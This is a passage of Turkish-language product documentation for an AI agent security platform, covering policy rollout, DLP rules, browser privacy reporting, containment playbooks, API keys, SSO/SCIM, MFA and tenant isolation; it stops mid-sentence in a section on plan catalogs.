güvenlik ekibinin kurum genelinde varsayılanlar belirlemesini sağlar; örneğin "bilinmeyen
her MCP sunucusu için onay iste" veya "depo dışına yazmayı reddet". Bu değişiklikler her
dizüstü bilgisayara tek tek dokunmadan yapılır.

**Nasıl çalışır.** `policy-management` fonksiyonu kayıtlı en yeni belgeyi okur ve yalnızca
desteklenen denetimleri derler. Ardından açıklamalı bir deneme çalıştırması (dry run)
döndürür veya imzalı bir çalışma zamanı politikası sürümü yayımlar. Desteklenmeyen
alanlar derlemeyi başarısız kılar. Desteklenen eylemler `command_default`,
`file_default`, `url_default`, `package_default`, `output_default`, `mcp_default`,
`mcp_unknown` ve `mcp_risky`'dir. MCP listeleri `mcp_allow_servers`,
`mcp_require_approval_servers`, `mcp_deny_servers` ve bunlara karşılık gelen `*_tools`
listeleridir. Eski bir sürümün üzerine yazma girişimi `409` döndürür. Bağlayıcılar
yayımlanan denetimleri bir sonraki yenilemede çeker ve bir yükleme makbuzu (load receipt)
raporlar.

**Nasıl kullanılır.** **Policies** sayfasını açın. Owner, admin ve member rolleri YAML
taslaklarını yazıp kaydedebilir. Ardından owner veya admin **Compile saved YAML (dry
run)** ile sonucu inceler ve **Compile and publish saved YAML** ya da **Publish runtime
policy JSON** ile yayımlar.

**Örnek.** `{"mcp_unknown": "ask"}` yayımlarsınız. Bir ajan izin listesi dışındaki bir MCP
sunucusunun aracını bir sonraki çağırışında bağlayıcı çağrıyı bant dışı onaya kadar
engeller. Model yalnızca bir eylem kimliği içeren engelleme gerekçesini görür.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (yayımlama yetkisi owner ve admin'de) | Bulut, On-prem, Air-gapped | Web konsolu; kayıtlı bağlayıcılar tarafından uygulanır |

**Sınırlamalar.** Yayımlamak, her ajanın o sürümü benimsediğini doğrulamaz. Yükleme
makbuzları ajanın kendi bildirimidir; ana makinenin politikayı uyguladığının kanıtı
değildir. Varsayılan eylem `allow` olsa bile tespit kuralları uygulanmaya devam eder.

### Kademeli politika dağıtımı ve geri alma

**Ne yapar.** Çalışma zamanı politikası düzenleyicisinin altındaki **Policy rollout**
bölümü, mevcut taslağı seçili ajanlara hazırlamanızı (stage) veya **sıralı bir canary
dağıtımı** başlatmanızı sağlar. İnceleme ve yeniden yayımlama için **sürüm geçmişini** de
tutar.

**Neden önemli.** Fazla katı bir politika tüm filoda geliştirici işini durdurabilir. Önce
birkaç ajanda denemek, sorun herkesi etkilemeden önce yakalanmasını sağlar.

**Nasıl çalışır.** Bir dağıtım planı (`policy_rollouts` ve `policy_rollout_batches`
tabloları) birbiriyle çakışmayan grupları (ring) sıraya koyar. İlk seçilen ajan
canary'dir. Kalan ajanlar sürümü ancak canary taze bir yükleme makbuzu bildirdikten sonra
alır. Dağıtım sürerken tenant politikası yedek olarak kalır. Beş dakikadan eski makbuzlar
güncelliğini yitirmiş (stale) olarak işaretlenir. Yeni bir taslak hazırlamak veya bir sürümü yeniden yayımlamak
etkin sıralı dağıtımı iptal eder.

**Nasıl kullanılır.** **Policies → Policy rollout** altında en fazla 200 ajan seçin;
ardından **Stage current draft for N selected agents** veya **Start ordered canary
rollout for N selected agents** düğmesine basın. Geri almak için geçmişte **Review version
N** seçeneğini kullanıp o sürümü yeniden yayımlayın.

**Örnek.** Durum satırı: "Latest ordered rollout: version 12, running; agent-reported
loads 1/5 current, 0 stale, 4 outdated, 0 unknown." Canary'nin makbuzundan sonra
sıradaki grup 12. sürümü alır.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (dağıtımı owner ve admin yönetir) | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Tek bir istek en fazla 1.667 ajan kabul eder ve 64 KB'a sığmalıdır.
Ekran bir seferde 200 ajan hazırlar ve 500 ajanlık sayfalar gösterir. İlerleme ajanın
kendi bildirimidir; ana makinede uygulamanın kanıtı değildir. Geri alma, eski bir sürümü
yeniden yayımlamak demektir; hiçbir adım kendi başına zamanlanmış olarak çalışmaz.

### DLP politika düzenleyicisi

**Ne yapar.** `/policies` sayfasındaki **DLP policy editor**, tenant için bir veri
sızıntısı önleme (DLP) belgesi oluşturur. Belgede etiketler, eşleştirme kuralları
(`keyword` veya `regex` eşleştiriciler, `any` ya da `all`), kural eylemleri (`redact`,
`block`, `ask`) ve süreli istisnalar bulunur.

**Neden önemli.** Ajanların gönderebileceği veya yazabileceği içeriklere kuruma özgü
tespitler eklemenizi sağlar; örneğin proje kod adları veya iç müşteri kimliği biçimleri.

**Nasıl çalışır.** Sunucu, `tenant_dlp_policies` tablosuna kaydetmeden önce motor şemasını
ve tenant sahipliğini doğrular. Okuma ve kaydetme MFA (AAL2) gerektirir ve
`/auth/dlp-step-up` sayfasını kullanır. Yalnızca owner veya admin kaydedebilir. `ask`,
"bant dışı operatör onayına kadar engelle" anlamına gelir. Düzenleyicide onaylama veya
kapatma düğmesi yoktur.

**Nasıl kullanılır.** İstendiğinde kimlik doğrulayıcı uygulamanızla doğrulayın. Etiket,
kural ve istisnaları ekleyin, doğrulanmış JSON önizlemesini kontrol edin ve kaydedin.

**Örnek.** `ACME-[0-9]{8}` regex'i ve `block` eylemiyle "Müşteri kimliği" kuralı. Kayıtlı
sürüm imzalı dağıtım yoluyla uç noktaya ulaştığında, girdisinde `ACME-12345678` geçen bir
araç çağrısı engellenir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (kaydetme yetkisi owner ve admin'de) | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Kaydetmek dağıtmak değildir; kayıtlı bir sürümü imzalı dağıtım yolunun
ayrıca dağıtması gerekir. Mevcut bağlayıcı kancaları (hook) yalnızca yürütmeden önceki
araç **girdisini** inceler. Çıktı yönündeki kurallar orada uygulanmaz; `redact` eşleşmesi
de girdiyi yeniden yazmak yerine engellenir.

### Tarayıcı gizliliği (Browser Privacy)

**Ne yapar.** `/privacy-guard`, Browser Guard'ın AI sohbet ürünlerine ulaşmadan önce 7
veya 30 gün içinde neleri maskelediğini, uyardığını veya engellediğini raporlar.
Kutucuklar **Prompts protected**, **Items masked**, **Blocked sends** ve **Active browser
installs**'tır. Sayfa ayrıca varlık türü ve AI sitesi dağılımlarını, günlük seriyi, son 25
taramayı (yalnızca sayımlar) ve yönetilen politika JSON'u üreten bir **Enroll browsers**
yardımcısını gösterir.

**Neden önemli.** CISO'ya, çalışanların ChatGPT, Gemini, Claude, Copilot ve benzeri
ürünlere ne sıklıkla kişisel veri veya gizli bilgi yapıştırdığını, metnin kendisini
toplamadan gösterir.

**Nasıl çalışır.** Kayıtlı tarayıcı profilleri, sabit
[telemetri sözleşmesine](../../../contracts/privacy-telemetry.md) göre `privacy_scan`
olayları gönderir. Ingest yalnızca site, eylem, kanal (`prompt`, `paste`, `file`), tür
bazında sayımlar, bulgu sayısı, isteğe bağlı politika kimliği ve zaman damgasını tutar;
gerisi atılır. Sayfa toplamları RLS altında
`public.privacy_guard_summary(tenant, 7 | 30)` ile okur.

**Nasıl kullanılır.**
1. Browser Guard paketini Chrome, Edge veya Firefox'a dağıtın.
2. **API Keys** sayfasında yazma yetkili bir tenant API anahtarı oluşturun.
3. **Browser Privacy → Enroll browsers** altında koruma modunu (`auto`, `confirm`,
   `block` veya `monitor`) seçin, politika JSON'unu kopyalayın, `apiKey` yer tutucusunu
   değiştirin ve tarayıcı yönetim aracınızla dağıtın. Örnek dosyalar
   [deploy/browser-guard](../../../../deploy/browser-guard/README.md) altındadır.

**Örnek.** 30 günde 1.240 korunan istem, 3.905 maskelenen öğe ve 18 engellenen gönderim;
kayıtlı 240 kurulumdan 212'si etkin. En sık varlık türü `EMAIL`, en sık site `chatgpt`.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Team, Business, Enterprise (katalog özelliği `browser_privacy_guard`) | Bulut, On-prem, Air-gapped | Chrome, Edge, Firefox; web konsolu |

**Sınırlamalar.** Kayıt yalnızca raporlama ekler; tespit ve maskeleme, tarayıcı kayıtlı
olsun ya da olmasın yerelde çalışır. Her kayıtlı profil bir ajan koltuğu kullanır.
Gizlilik taramaları denetim dışa aktarımına dahil değildir.

### AutoSecOps görünümü ve müdahale playbook'ları

**Ne yapar.** `/autosecops`, AutoSecOps çalışma zamanı güvenlik kontrol düzlemini AIDR
içinden gösterir: entegrasyon durumu, çalışma zamanı durumu, etkin ajanlar, açık
bozulmalar ve bir çalışma zamanı filo tablosu (ajan, çalışma zamanı veya bağlayıcı,
durum, sağlık, son olay). Ayrıca `response-playbooks` API'si kayıtlı bir ajana karşı
yerleşik `agent_containment_v1` playbook'unu çalıştırır.

**Neden önemli.** Bir olay doğrulandığında, müdahale ekibinin tek bir ajanı kontrollü ve
denetlenebilir biçimde sınırlaması gerekir. Geçici betikler bunu sağlamaz.

**Nasıl çalışır.** Sayfa `autosecops-runtime` fonksiyonunu çağırır. Köprüye ulaşılamazsa
hata gösterir; yapay veya önbellekten veri göstermez. Playbook önce `agent_pause`
komutunu kuyruğa alır. `network_isolate` ancak filo müdahale çalışanı (worker) ilk adımın
doğrulanmış başarısını kaydettikten sonra kuyruğa girer. Çalışmayı yalnızca kalıcı olarak
kaydedilmiş bir `succeeded` sonucu ilerletir. Başarısızlık, süre aşımı veya belirsiz bir
sonuç çalışmayı durdurur (önceki bir adım başarılıysa sonuç `partial` olur).

**Nasıl kullanılır.** AAL2 oturumundaki bir owner veya admin şunu gönderir:
```json
{ "action": "start", "tenant_id": "<tenant>", "agent_id": "<ajan>",
  "incident_reference": "<uuid>", "playbook_id": "agent_containment_v1",
  "reason": "Doğrulanan olayı sınırla", "idempotency_key": "incident-2026-0001",
  "ttl_seconds": 300 }
```
İlerlemeyi `{"action":"status","tenant_id":"<tenant>","run_id":"<run>"}` ile okuyun.

**Örnek.** Çalışma ajanı duraklatır. Uç nokta çalışanı ana makine durumunu doğrulayıp
başarı bildirir ve `network_isolate` kuyruğa girer. O işletim sisteminde yalıtım
adaptörü yoksa çalışma `partial` olarak biter.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Ayrı bir katalog kalemi değil | Bulut, On-prem (AutoSecOps entegrasyonu ve uç nokta çalışanı gerekir) | Web konsolu; uç nokta adaptörleri işletim sistemine göre değişir |

**Sınırlamalar.** Tek bir yerleşik playbook vardır. Betik, rastgele komut, kimlik bilgisi
iptali veya harici SOAR eylemi desteklenmez. `incident_reference` saklanır ancak
doğrulanmaz. Bu özellik işletim sistemi doğrulamasını (attestation) veya müşteri uç nokta
izinlerini kanıtlamaz.

### API anahtarları ve kayıt belirteçleri

**Ne yapar.** `/api-keys`, manuel kurulumlar, Browser Guard ve destek senaryoları için
tenant **API anahtarları** üretir ve iptal eder. Ayrıca bir ajanın kendi anahtarıyla
değiştirdiği, tek kullanımlık ve kısa ömürlü **kayıt belirteçleri** (enrollment token)
üretir.

**Neden önemli.** CI çalıştırıcıları gibi gözetimsiz makineler tarayıcıda onay veremez.
Bu makinelere kapsamı dar, süresi dolan ve bir kez kullanılınca işe yaramaz hale gelen
bir kimlik bilgisi gerekir.

**Nasıl çalışır.** Açık metin yalnızca bir kez gösterilir; sadece SHA-256 özetleri
saklanır. Kayıt belirteçleri varsayılan olarak 24 saat geçerlidir
(`AIDR_ENROLLTOKEN_DEFAULT_TTL_HOURS`) ve 1 saat ile 30 gün arasında ayarlanabilir.
Anahtar oluşturmak için çalışma alanının kabul edilmiş olması gerekir. Owner, admin ve
member oluşturabilir; viewer oluşturamaz.

**Nasıl kullanılır.** Bir etiket girin (örneğin `ci-runner`), belirteci oluşturun ve uç
nokta yapılandırmasına ekleyin:
```json
{ "mode": "managed",
  "control_plane": { "endpoint": "https://api.aidr.example.com" },
  "auth": { "enrollment_token": "<belirteç>" } }
```
Bağlayıcı ilk bağlantıda belirteci bir API anahtarıyla değiştirir.

**Örnek.** Varsayılan ömürle saat 09:00'da oluşturulan belirteci bir derleme ajanı
09:05'te kullanır. İkinci kullanım veya ertesi gün 09:00'dan sonraki kullanım reddedilir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Web konsolu; Windows, macOS, Linux uç noktalar |

**Sınırlamalar.** Kaybolan bir anahtar yeniden gösterilemez; iptal edilip yenisi
üretilmelidir. Anahtar veya belirteç oluşturmadan önce çalışma alanı erişimi etkin
olmalıdır.

### Ekip, roller ve davetler

**Ne yapar.** `/team` üyeleri ve rolleri (`owner`, `admin`, `member`, `viewer`), bekleyen
davetleri ve CSV/JSON dışa aktarımlı **Team audit** panelini yönetir. Davetler
`/enterprise` adresinde kabul edilir.

**Neden önemli.** En az yetki ilkesi: viewer okur, member ajan kaydeder ve politika
düzenler; üyeliği, faturalamayı ve çalışma alanı ayarlarını yalnızca owner ve admin
değiştirir.

**Nasıl çalışır.** `team-invite` fonksiyonu 7 gün geçerli, tek kullanımlık ve alıcının
e-posta adresine bağlı bir bağlantı üretir. Bir e-posta sağlayıcısı yapılandırılmışsa
(`AIDR_MAIL_PROVIDER=resend` ile `RESEND_API_KEY` ve `AIDR_MAIL_FROM`) bağlantıyı
e-postayla gönderir ve `delivery: "email"` bildirir. Aksi halde bağlantıyı elle paylaşmanız
için döndürür (`delivery: "manual"`). Başarısız bir gönderim, bağlantıyla birlikte
`email_delivery: "failed"` olarak bildirilir. Bağlantı hiçbir zaman günlüğe yazılmaz.
`team_members` üzerindeki RLS aynı rol kurallarını tekrarlar; API ile sayfa atlatılamaz.

**Nasıl kullanılır.** **Team** sayfasında e-postayı ve rolü girip daveti gönderin. Yanıt
teslimatın manuel olduğunu söylüyorsa bağlantıyı kopyalayın. Rolleri üye listesinden
değiştirin veya üyeleri kaldırın. **Team audit** altında **Prepare CSV export** veya
**Prepare JSON export** kullanın.

**Örnek.** Bir admin `sec-reviewer@acme.example` adresini `viewer` olarak davet eder.
E-posta sağlayıcısı yapılandırılmadığı için yanıt bağlantıyı gösterir; admin bağlantıyı
şirket içi sohbetten iletir. İnceleyici oturum açar ve salt okunur bir görünüm alır.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped (manuel bağlantı; e-posta için sağlayıcıya çıkış erişimi gerekir) | Web konsolu |

**Sınırlamalar.** E-posta teslimi Resend sağlayıcısı ve internet çıkışı gerektirir. Ekip
denetim paneli son 1.000 kaydı gösterir. Tarayıcıdan dışa aktarım 100.000 kayıt veya 64
MiB ile sınırlıdır; fazlası için sayfalı dışa aktarım API'sini kullanın.

### Çalışma alanı ayarları: ad, saklama süresi, kapatma

**Ne yapar.** `/settings`, owner ve admin'in çalışma alanını yeniden adlandırmasına ve
gün cinsinden **telemetri saklama süresini** belirlemesine olanak tanır. Owner
**çalışma alanını kapatabilir**. Sayfa ayrıca bu oturumun MFA durumunu, görünüm
ayarlarını ve gizlilik, güvenlik, koşullar ve destek bağlantılarını gösterir.

**Neden önemli.** Saklama süresi bir veri koruma kararıdır ve KVKK/GDPR'daki veri
minimizasyonu yükümlülüklerini desteklemek üzere tasarlanmıştır. Bir çalışma alanını
kapatmak erişimi hemen kesmeli ve verileri tanımlı bir takvimle silmelidir.

**Nasıl çalışır.** `tenant-settings` fonksiyonu kimlik bariyerini ve AAL2'yi kontrol eder,
ardından denetim kaydını aynı işlemde (transaction) yazan, satır kilitli veritabanı
fonksiyonlarını çağırır. Saklama süresi 1 ile 3.650 gün arasında olabilir; yeni çalışma
alanları 30 günle başlar. Süreyi kısaltmak açık onay gerektirir (aksi halde
`retention_reduction_unconfirmed`). Kapatma offboarding iş akışını kullanır: API
anahtarları, SCIM belirteçleri ve devredilmiş kimlik bilgileri hemen iptal edilir, üyeler
erişimi kaybeder ve veriler her saklama süresi dolduğunda silinir. Etkin yasal saklama
kararları silmeyi durdurur.

**Nasıl kullanılır.** **Settings → Workspace** bölümünü açın. Adı veya saklama süresini
değiştirip **Save workspace settings** düğmesine basın. Kapatmak için **Close
workspace** altında çalışma alanı adını birebir yazıp onaylayın.

**Örnek.** Bir admin saklama süresini 90 günden 30 güne indirir. Form, "I understand
that shortening retention … makes older telemetry eligible for permanent deletion."
kutusunun işaretlenmesini ister. Değişiklik kaydedilir ve denetim günlüğünde görünür.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Ticari kayıtlar ve güvenlik denetim kayıtları kendi asgari saklama
sürelerini korur. Kapatma konsoldan geri alınamaz. Yedek kopyalar ayrı yedek saklama
sürecine tabidir ve kapatmayla silinmez.

### Faturalama ve plan

**Ne yapar.** `/billing` tenant'ın mevcut planını ve kaynağını (kart aboneliği, ekip
kaydı veya varsayılan) gösterir. Kullanımdaki korunan ajanları kabul edilen ajanlarla
karşılaştırır, kabul durumunu ve dönem sonunu, bir **Change plan** seçicisini gösterir.
Ayrıca kurumsal sipariş taleplerini ve koltuk özetini (dahil, ek, izin verilen, bağlı)
listeler.

**Neden önemli.** Satın alma ekibi ve yöneticiler, neyin ödendiğini ve neyin
kullanıldığını tek yerde görmelidir. Bekleyen bir sipariş asla kapasiteye dönüşmemelidir.

**Nasıl çalışır.** Sayfa, üyeliği ve kimlik bariyerini yeniden kontrol eden ve yalnızca
üyelere açık olan `get_tenant_plan` projeksiyonunu okur. Varsayılan **fatura** derlemesinde
(`VITE_AIDR_COMMERCIAL_MODE` boş veya `invoice`), **Request upgrade** düğmesi
`invoice-entitlement` üzerinden tenant'a bağlı bir talep oluşturur. Talep
`pending_finance` olarak kaydedilir. Kapasite ancak Finans siparişi onaylayıp bir
operatör lisansı tanımladıktan sonra değişir. Kart ödemesi yalnızca açıkça etkinleştirilmiş
self-service derlemelerde görünür (bkz. [ödeme yolları](#ödeme-yolları-fatura-ve-kart)).

**Nasıl kullanılır.** Owner veya admin **Billing** sayfasında planı, dönemi ve geliştirici
koltuk sayısını (en az plan asgarisi) seçip **Request upgrade** düğmesine basar.

**Örnek.** Bir owner 30 koltuk için Business talep eder. Sayfa "This request is reviewed
by Finance and invoiced; it does not change the plan until an approved order is
applied." der. O zamana kadar kabul edilen ajan sayısı değişmez.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut; on-prem'de bunun yerine [imzalı lisans](#çevrimdışı-imzalı-lisans) kullanılır | Web konsolu |

**Sınırlamalar.** Self-service kart ödemesi varsayılan olarak kapalıdır ve canlı bir
sağlayıcı hesabıyla kabul edilmemiştir. Katalog fiyatları liste fiyatıdır; teklif veya
sipariş geçerlidir. Plan verisi okunamazsa sayfa tahmin yürütmek yerine hiç rakam
göstermez.

---

## 4. Kimlik ve erişim

### Tek oturum açma: Microsoft Entra ID ve SAML 2.0

**Ne yapar.** Kullanıcılar konsola, dağıtımın etkinleştirdiği yöntemlerle girer: parola,
sihirli bağlantı (magic link), Google, GitHub, **Microsoft Entra ID** (OAuth sağlayıcısı
`azure`, kapsamlar `openid profile email`) ve **SAML 2.0** sağlayıcıları ("company SSO").
Entra ID grup kimlikleri AIDR rollerine eşlenebilir (`azure-ad-groups`).

**Neden önemli.** Merkezi kimlik sayesinde işten ayrılanların IdP erişimi kaldırıldığında
konsol erişimi de kalkar; parola politikası ve koşullu erişim IdP'nizde kalır.

**Nasıl çalışır.** Konsol sunucusu yalnızca `AIDR_AUTH_METHODS` içinde listelenen
yöntemleri sunar (`password`, `magic-link`, `google`, `github`, `azure`; varsayılan
`password`). SAML düğmeleri tam olarak şu ayarlardan birinden gelir: `AIDR_SAML_PROVIDERS`
(en fazla 8 `{providerId, label}` içeren bir JSON listesi), `AIDR_SAML_PROVIDER_ID` veya
`AIDR_SAML_DOMAIN`. Oturum açma Supabase Auth üzerinden yapılır. İsteğe bağlı Cloudflare
Turnstile captcha, `VITE_TURNSTILE_SITE_KEY` ve Auth captcha ayarlarıyla açılır.

**Nasıl kullanılır.** `AIDR_AUTH_METHODS=password,azure` ayarlayın ve Entra uygulamasını
Auth'ta yapılandırın. SAML için IdP'yi Auth'ta kaydedin ve
`AIDR_SAML_PROVIDERS='[{"providerId":"<uuid>","label":"Acme SSO"}]'` ayarlayın. Helm'de
`dashboard.authMethods` ve `dashboard.saml.*` değerlerini kullanın.

**Örnek.** Kullanıcı **Acme SSO** düğmesine basar, kurumsal IdP'de kimliğini doğrular ve
grubundan eşlenen rolle `/dashboard` sayfasına gelir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Entra ID SSO: Team, Business, Enterprise (`entra_sso`). SAML ayrı bir katalog kalemi değildir; teklifte netleştirin. | Bulut, On-prem; Air-gapped yalnızca IdP yalıtılmış ağ içinden erişilebilirse | Web konsolu |

**Sınırlamalar.** Bulutta kayıt varsayılan olarak kapalıdır (`AIDR_SIGNUP_MODE=closed`);
self-hosted temel yapılandırma da kaydı kapatır. Belgelenmiş çift sahipli geçiş ve geri
alma prosedürü tamamlanmadan "SAML zorunlu" sağlayıcı politikasını açmayın.

### SCIM dizin senkronizasyonu

**Ne yapar.** `/scim` (**Directory provisioning**, yalnızca sahipler) SCIM 2.0 taşıyıcı
(bearer) kimlik bilgileri üretir ve değişmez IdP grup kimliklerini AIDR rollerine eşler.
IdP ardından kullanıcıları ve grupları `https://<api-host>/functions/v1/scim/v2` adresine
(`/Users`, `/Groups`) aktarır.

**Neden önemli.** İşe giriş, görev değişikliği ve ayrılma olayları dizininizden akar;
konsol erişimi elle temizlik gerektirmeden İK durumunu izler.

**Nasıl çalışır.** Yeni kimlik bilgileri varsayılan olarak 90 gün sonra sona erer. Döndürme
(rotation), siz yenisini doğrulayıp eskisini iptal edene kadar önceki bilgiyi etkin
tutar. Eşlemeler birebir `Group.externalId` değerini kullanır. Görünen adlar ve kullanıcı
meta verileri hiçbir zaman rol vermez; SCIM asla `owner` rolü veremez.

**Nasıl kullanılır.** **Provisioning credentials** altında bir etiket girin, kimlik
bilgisini oluşturun ve bir kez kopyalayın. Entra ID veya IdP'nizdeki SCIM uygulamasını
temel adres ve belirteçle yapılandırın. Grup eşlemelerini **Group-to-role mappings**
altında ekleyin.

**Örnek.** `8c1e…` grubu `member` rolüne eşlenmiştir. İK bir geliştiriciyi bu gruba
eklediğinde IdP kullanıcıyı oluşturur ve kullanıcı `member` rolünü alır. Gruptan
çıkarıldığında erişimi kalkar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Business, Enterprise (`scim`) | Bulut, On-prem, Air-gapped (IdP'nin API'ye ulaşabilmesi gerekir) | Herhangi bir SCIM 2.0 istemcisi; web konsolu |

**Sınırlamalar.** SCIM senkronizasyonu SSO'yu zorunlu kılmaz. Sayfa yalnızca etkin
sahiplere açıktır.

### Çok faktörlü doğrulama, kurtarma ve oturum iptali

**Ne yapar.** Konsol TOTP tabanlı MFA'yı destekler. Hassas değişiklikler **AAL2**
oturumu gerektirir: çalışma alanı ayarları, DLP politikası, keşif kimlik bilgileri,
playbook'lar ve tüm operatör işlemleri. Bir tenant politikası tüm üyeler için MFA'yı
zorunlu kılabilir. Kullanıcılar parola sıfırlama veya kendi ürettikleri **acil durum
(break-glass) kurtarma kodlarıyla** (`/auth/recover`) hesaplarını kurtarabilir. Tüm
oturumlar anında iptal edilebilir.

**Neden önemli.** Çalınan bir parola tek başına saldırgana politikayı zayıflatma veya
çalışma alanını kapatma imkânı vermemelidir. Ele geçirilmiş bir oturum, belirteç süresinin
dolmasını beklemeden hemen sonlandırılabilmelidir.

**Nasıl çalışır.** `identity-security` fonksiyonu `status`, `set_policy` (`require_mfa`,
`break_glass_enabled`), `revoke_sessions`, `rotate_recovery_codes`, parola kurtarma ve
`break_glass_recover` işlemlerini yürütür. **Kimlik bariyeri** (`checkIdentityBarrier`),
her ayrıcalıklı Edge Function okuma veya yazmasından önce çalışır: iptalden önce açılmış
oturumları reddeder ve tenant'ın MFA ve SAML politikasını uygular. Politika satırı
okunamazsa istek reddedilir. Kurtarma kodları bir kez gösterilir ve özet olarak saklanır.
Kullanıcı kodları yalnızca kendisi için, AAL2 oturumundan ve tenant break-glass'ı
etkinleştirmişse üretebilir.

**Nasıl kullanılır.** **Settings → Profile**, "Verified for this session (AAL2)" yazar
veya **Set up or verify MFA** düğmesini sunar. Tenant MFA politikası `identity-security`
API'si (`set_policy`) ile ayarlanır.

**Örnek.** AAL1 oturumundaki bir admin saklama süresini kısaltmaya çalışır. Konsol onu
**Verify with authenticator** adımına yönlendirir; TOTP'den sonra değişiklik uygulanır.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Herhangi bir TOTP doğrulayıcı uygulaması; web konsolu |

**Sınırlamalar.** Konsolda tenant MFA politikası için henüz bir düğme yoktur; API ile
ayarlanır. Auth e-postaları (parola kurtarma) için dağıtımda SMTP ayarları gerekir.

### Cihaz koduyla kayıt

**Ne yapar.** Uç nokta, kopyalanan bir anahtar yerine kısa bir kodla kaydolur. Ajan bir
kod ve adres yazdırır, oturum açmış bir kullanıcı kodu `/verify` sayfasında onaylar ve uç
nokta imzalı, tenant'a bağlı bir `managed.json` alır.

**Neden önemli.** Sohbet veya e-posta üzerinden uzun ömürlü bir sır geçmez. Her kayıt
adı belli bir onaylayıcıya ve tenant'a bağlanır.

**Nasıl çalışır.** RFC 8628 cihaz akışını üç fonksiyonla izler: `device-start`,
`device-verify` ve `device-poll`. Kodlar 10 dakika geçerlidir (`AIDR_DEVICE_TTL_MINUTES`)
ve tek kullanımlıktır. Sorgulama aralığı 3 saniyedir (`AIDR_DEVICE_POLL_INTERVAL_SECONDS`);
`slow_down` yanıtı aralığı 5 saniye artırır. Kimlik doğrulamasız `device-start` rotası,
istemci IP'sini HMAC ile imzalayan güvenilir giriş imzalayıcısının
(`deploy/ingress/device-start.mjs`) arkasında olmalıdır. İmzalayıcı yoksa fonksiyon
istekleri reddeder. Kayıt ayrıca tenant'ın kabul edilmiş kapasitesini kontrol eder.

**Nasıl kullanılır.** Bağlayıcıyı yönetilen modda kurup ajanı başlatın. Yazdırılan adresi
açın, oturum açın, kodu girin, ekibi seçin ve onaylayın. Ajanı yeniden başlatın.

**Örnek.** Ajan sekiz karakterli `K7MPQ2XR` kodunu ve `https://aidr.example.com/verify`
bağlantısını yazdırır. Geliştirici **Team receiving this device** alanında ekibi seçip 10
dakika içinde onaylar. Ajan yönetilen durumunu `~/.singularity-aidr/managed.json`
altında önbelleğe alır ve raporlamaya başlar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem (imzalayıcılı Compose; Helm'de imzalayıcıyı ayrıca kurun veya kayıt belirteci kullanın), Air-gapped | Windows, macOS, Linux'ta bağlayıcılar |

**Sınırlamalar.** Cihaz yetkilendirmesi kontrol düzlemine ağ erişimi gerektirir. Kod veya
onay tek başına ana makinenin bağlayıcıyı yüklediğini kanıtlamaz; ana makine
kontrollerini kullanın.

---

## 5. Çok kiracılı yapı ve yalıtım

### Satır düzeyi güvenlik ve kimlik bariyeriyle tenant yalıtımı

**Ne yapar.** Her müşteri bir **tenant**'tır (ekip çalışma alanı). Her tenant tablosu
`app.is_tenant_member(tenant_id)` ve role duyarlı türevleri üzerinden satır düzeyi
güvenlik (RLS) uygular. Böylece bir kullanıcı yalnızca etkin bir tenant'ta süresi dolmamış
etkin üyeliği olan çalışma alanlarının satırlarını okuyabilir.

**Neden önemli.** Paylaşılan bir SaaS veritabanında tek bir eksik `WHERE tenant_id = …`
başka bir müşterinin telemetrisini açığa çıkarabilir. RLS bunu veritabanının kendisine
reddettirir.

**Nasıl çalışır.** Politikalar migration dosyalarında yer alır
(`20260805000000_hybrid_tenancy.sql`, `20260912000019_tenant_lifecycle_rls.sql` ve sonraki
sıkılaştırma migration'ları). Tarayıcı rollerine hiçbir zaman anonim yazma izni verilmez.
Service-role kullanan Edge Functions tasarım gereği RLS'yi atlar. Bu yüzden her biri,
ayrıcalıklı bir okuma veya değişiklikten önce üyeliği, tenant durumunu ve kimlik
bariyerini yeniden kontrol eder; bir kontrol tamamlanamazsa isteği reddeder. Tenant
bazında hız sınırları ile depolama ve kuyruk kotaları paylaşılan kaynakları sınırlar. API
anahtarları, kayıt belirteçleri, SCIM ve toplayıcı kimlik bilgileri özet olarak saklanır.

**Nasıl kullanılır.** Yapılandırılacak bir şey yoktur; yalıtım her dağıtımda şemanın
parçasıdır. Her müşteri veya iş birimi için bir tenant kullanın.

**Örnek.** A tenant'ının bir üyesi REST API ile B tenant'ının `events` tablosunu sorgular.
Sorgu hiç satır döndürmez. B tenant'ı için yapılan bir Edge Function çağrısı `403` döner.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | - |

**Sınırlamalar.** Yalıtım tek bir veritabanı içinde mantıksaldır. On-prem size fiziksel
olarak ayrı bir kurulum sağlar. Müşterinin veritabanı yöneticileri kendi kurulumlarındaki
tüm tenant'ları görebilir.

---

## 6. Planlar, deneme ve kabul (admission)

### Plan kataloğu ve plan x özellik matrisi

**Ne yapar.** `public.plans` (migration `20260925000010_plan_catalog.sql`) planların, liste
fiyatlarının, asgari koltuk sayılarının, dağıtım seçeneklerinin, liste saklama
sürelerinin ve özellik anahtarlarının tek kaynağıdır. `/pricing` sayfası, bir sapma
